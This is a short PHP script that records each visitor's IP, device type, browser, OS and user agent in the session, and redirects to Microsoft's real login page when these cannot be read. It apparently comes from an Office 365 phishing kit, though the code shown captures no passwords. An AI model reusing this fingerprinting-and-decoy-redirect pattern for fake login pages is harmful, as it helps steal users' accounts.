<?php
     if(getenv('HTTP_CLIENT_IP'))       {$_SESSION['ip'] = getenv('HTTP_CLIENT_IP');}
else if(getenv('HTTP_X_FORWARDED_FOR')) {$_SESSION['ip'] = getenv('HTTP_X_FORWARDED_FOR');}
else if(getenv('HTTP_X_FORWARDED'))     {$_SESSION['ip'] = getenv('HTTP_X_FORWARDED');}
else if(getenv('HTTP_FORWARDED_FOR'))   {$_SESSION['ip'] = getenv('HTTP_FORWARDED_FOR');}
else if(getenv('HTTP_FORWARDED'))       {$_SESSION['ip'] = getenv('HTTP_FORWARDED');}
else if(getenv('REMOTE_ADDR'))          {$_SESSION['ip'] = getenv('REMOTE_ADDR');}
else                                    {header("Location: https://login.microsoftonline.com/");}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['domain'] = $_SERVER['HTTP_HOST'];
$_SESSION['date'] = date("d/m/Y");
$_SESSION['time'] = date("h:i:00");

if($mobile = is_numeric(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), "mobile"))) {$_SESSION['device'] = 'Mobile';}
elseif($tablet = is_numeric(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), "tablet"))) {$_SESSION['device'] = 'Tablet';}
elseif($desktop = !$mobile && !$tablet) {$_SESSION['device'] = 'Desktop';} 
else {header("Location: https://login.microsoftonline.com/");}

function getUserBrowser(){
$fullUserBrowser = (!empty($_SERVER['HTTP_USER_AGENT'])? 
$_SERVER['HTTP_USER_AGENT']:getenv('HTTP_USER_AGENT'));
$userBrowser = explode(')', $fullUserBrowser);
$userBrowser = $userBrowser[count($userBrowser)-1];

if((!$userBrowser || $userBrowser === '' || $userBrowser === ' ' || strpos($userBrowser, 'like Gecko') === 1) && strpos($fullUserBrowser, 'Windows') !== false){
        return 'Internet-Explorer';
}else if((strpos($userBrowser, 'Edge/') !== false || strpos($userBrowser, 'Edg/') !== false) && strpos($fullUserBrowser, 'Windows') !== false){
        return 'Microsoft-Edge';
}else if(strpos($userBrowser, 'Chrome/') === 1 || strpos($userBrowser, 'CriOS/') === 1){
        return 'Google-Chrome';
}else if(strpos($userBrowser, 'Firefox/') !== false || strpos($userBrowser, 'FxiOS/') !== false){
        return 'Mozilla-Firefox';
}else if(strpos($userBrowser, 'Safari/') !== false && strpos($fullUserBrowser, 'Mac') !== false){
        return 'Safari';
}else if(strpos($userBrowser, 'OPR/') !== false && strpos($fullUserBrowser, 'Opera Mini') !== false){
        return 'Opera-Mini';
}else if(strpos($userBrowser, 'OPR/') !== false){
        return 'Opera';
}
return false;
}
$_SESSION['browser'] = getUserBrowser();


function getOS() { 

        global $user_agent;
    
        $os_platform  = "Unknown OS Platform";
    
        $os_array     = array(
                              '/windows nt 10/i'      =>  'Windows 10',
                              '/windows nt 6.3/i'     =>  'Windows 8.1',
                              '/windows nt 6.2/i'     =>  'Windows 8',
                              '/windows nt 6.1/i'     =>  'Windows 7',
                              '/windows nt 6.0/i'     =>  'Windows Vista',
                              '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                              '/windows nt 5.1/i'     =>  'Windows XP',
                              '/windows xp/i'         =>  'Windows XP',
                              '/windows nt 5.0/i'     =>  'Windows 2000',
                              '/windows me/i'         =>  'Windows ME',
                              '/win98/i'              =>  'Windows 98',
                              '/win95/i'              =>  'Windows 95',
                              '/win16/i'              =>  'Windows 3.11',
                              '/macintosh|mac os x/i' =>  'Mac OS X',
                              '/mac_powerpc/i'        =>  'Mac OS 9',
                              '/linux/i'              =>  'Linux',
                              '/ubuntu/i'             =>  'Ubuntu',
                              '/iphone/i'             =>  'iPhone',
                              '/ipod/i'               =>  'iPod',
                              '/ipad/i'               =>  'iPad',
                              '/android/i'            =>  'Android',
                              '/blackberry/i'         =>  'BlackBerry',
                              '/webos/i'              =>  'Mobile'
                        );
    
        foreach ($os_array as $regex => $value)
            if (preg_match($regex, $user_agent))
                $os_platform = $value;
    
        return $os_platform;
    }
    $_SESSION['os'] = getOS();
    $_SESSION['userAgent'] = $user_agent;

?>